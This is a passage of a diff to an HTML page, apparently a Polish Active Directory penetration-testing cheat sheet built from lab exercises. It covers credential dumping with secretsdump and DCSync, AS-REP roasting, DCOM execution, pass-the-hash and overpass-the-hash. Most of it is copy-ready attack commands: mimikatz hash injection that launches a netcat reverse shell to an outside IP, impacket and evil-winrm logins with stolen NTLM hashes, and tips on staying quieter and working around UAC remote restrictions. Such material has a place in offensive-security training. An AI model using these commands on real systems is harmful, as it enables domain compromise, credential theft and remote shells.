 <h4 class="leaf">secretsdump (Linux/impacket — alternatywa bez wchodzenia na hosta)</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>impacket-secretsdump $DOMAIN/user:password@$IP           # zdalny dump SAM+LSA+NTDS
 impacket-secretsdump -just-dc $DOMAIN/user:password@$DC   # DCSync przez sieć (całe NTDS.dit)</code></pre></div></section><section class="card" data-text="5.3 kerberos as-rep roasting (linux — patrz też §1.8) cel: konta z flagą `dont_require_preauth` (uac `0x410200`). bez creds można samą listą userów; z creds `-request` bierze hash. impacket-getnpusers $domain/ -dc-ip $dc -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
@@ -1713,10 +1769,11 @@ $Opt = New-CimSessionOption -Protocol DCOM
 $Session = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=&quot;powershell -enc &lt;b64&gt;&quot;}</code></pre></div></section><section class="card" data-text="7.2 pass-the-hash / ticket / key pass-the-hash (ntlm) mimikatz
 token::revert
-sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444&quot; z linuxa: xfreerdp /v:$ip /u:domain\\myuser /pth:ntlm_hash
-impacket-psexec -hashes :ntlm_hash domain/myuser@$ip
+sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444&quot; z linuxa (format `-hashes lm:nt` — lm wypełnij 32 zerami gdy masz tylko nt): xfreerdp /v:$ip /u:domain\\myuser /pth:ntlm_hash
+impacket-wmiexec -hashes :ntlm_hash administrator@$ip    # ciszej niż psexec (bez usługi/pliku, shell jako user)
+impacket-psexec  -hashes :ntlm_hash domain/myuser@$ip    # głośny: usługa + exe na admin$, ale shell system
 evil-winrm -i $ip -u myuser -h ntlm_hash
-crackmapexec smb $ip -u myuser -h ntlm_hash overpass-the-hash (hash ntlm → bilet kerberos) gdy cel wymusza **kerberos** (psexec/usługa po nazwie hosta, nie po ip), a masz tylko hash ntlm. zamień hash na tgt i uwierzytelniaj się kerberosem. wymaga admina lokalnie (odczyt lsass). mimikatz # privilege::debug
+smbclient \\\\$ip\\secrets -u administrator --pw-nt-hash &lt;nthash&gt;   # samo czytanie share&#x27;a nt hashem ⚠️ **dlaczego pth nie działa (90% przypadków):** **uac remote restrictions** (default od visty) blokują zwykłych local-adminów zdalnie — niezawodnie do code-exec działa tylko **wbudowany administrator (rid 500)**. konta domenowe działają zawsze (`corp/administrator@ip`). ten sam local-admin password bywa **współdzielony** między hostami → hash z jednego otwiera resztę. overpass-the-hash (hash ntlm → bilet kerberos) gdy cel wymusza **kerberos** (psexec/usługa po nazwie hosta, nie po ip), a masz tylko hash ntlm. zamień hash na tgt i uwierzytelniaj się kerberosem. wymaga admina lokalnie (odczyt lsass). mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords          :: wyciągnij hash ntlm ofiary
 mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell :: w nowym powershellu (kontekst ofiary):
 klist                                   :: na start 0 biletów
@@ -1736,11 +1793,13 @@ sekurlsa::pth /user:administrator /domain:za.tryhackme.com /aes256:b54259bbff03a
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>mimikatz
 token::revert
 sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444&quot;</code></pre></div>
-<p>Z Linuxa:</p>
+<p>Z Linuxa (format <code>-hashes LM:NT</code> — LM wypełnij 32 zerami gdy masz tylko NT):</p>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>xfreerdp /v:$IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
-impacket-psexec -hashes :NTLM_HASH DOMAIN/MyUser@$IP
+impacket-wmiexec -hashes :NTLM_HASH Administrator@$IP    # ciszej niż psexec (bez usługi/pliku, shell jako user)
+impacket-psexec  -hashes :NTLM_HASH DOMAIN/MyUser@$IP    # głośny: usługa + exe na ADMIN$, ale shell SYSTEM
 evil-winrm -i $IP -u MyUser -H NTLM_HASH
-crackmapexec smb $IP -u MyUser -H NTLM_HASH</code></pre></div>
+smbclient \\\\$IP\\secrets -U Administrator --pw-nt-hash &lt;NThash&gt;   # samo CZYTANIE share&#x27;a NT hashem</code></pre></div>
+<blockquote>⚠️ <strong>Dlaczego PtH nie działa (90% przypadków):</strong> <strong>UAC remote restrictions</strong> (default od Visty) blokują zwykłych local-adminów zdalnie — niezawodnie do code-exec działa tylko <strong>wbudowany Administrator (RID 500)</strong>. Konta domenowe działają zawsze (<code>CORP/Administrator@IP</code>). Ten sam local-admin password bywa <strong>współdzielony</strong> między hostami → hash z jednego otwiera resztę.</blockquote>
 <h4 class="leaf">Overpass-the-Hash (hash NTLM → bilet Kerberos)</h4>
 <blockquote>Gdy cel wymusza <strong>Kerberos</strong> (PsExec/usługa po nazwie hosta, nie po IP), a masz tylko hash NTLM. Zamień hash na TGT i uwierzytelniaj się Kerberosem. Wymaga admina lokalnie (odczyt LSASS).</blockquote>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>mimikatz # privilege::debug
